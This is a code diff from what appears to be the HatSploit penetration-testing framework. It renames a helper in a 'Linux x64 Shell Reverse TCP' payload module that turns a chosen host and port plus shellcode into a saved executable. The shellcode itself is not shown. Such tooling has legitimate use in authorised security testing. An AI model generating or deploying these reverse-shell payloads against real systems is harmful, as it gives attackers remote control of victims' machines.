@@ -27,11 +27,11 @@
 from core.lib.module import HatSploitModule
 
 from utils.tcp.tcp import tcp
-from utils.payload.hatvenom import hatvenom
+from utils.payload.payload import payload
 
 class HatSploitModule(HatSploitModule):
     tcp = tcp()
-    hatvenom = hatvenom()
+    payload = payload()
 
     details = {
         'Name': "Linux x64 Shell Reverse TCP",
@@ -79,10 +79,10 @@ class HatSploitModule(HatSploitModule):
     def run(self):
         local_host, local_port, file_format, local_file = self.parser.parse_options(self.options)
 
-        local_host = self.hatvenom.host_to_bytes(local_host)
-        local_port = self.hatvenom.port_to_bytes(local_port)
+        local_host = self.payload.host_to_bytes(local_host)
+        local_port = self.payload.port_to_bytes(local_port)
 
-        if not file_format in self.hatvenom.formats.keys():
+        if not file_format in self.payload.formats.keys():
             self.badges.output_error("Invalid format!")
             return
 
@@ -128,7 +128,7 @@ class HatSploitModule(HatSploitModule):
         )
 
         self.badges.output_process("Generating payload...")
-        payload = self.hatvenom.generate(file_format, 'x64', shellcode)
+        payload = self.payload.generate(file_format, 'x64', shellcode)
 
         self.badges.output_process("Saving to " + local_file + "...")
         with open(local_file, 'wb') as f:
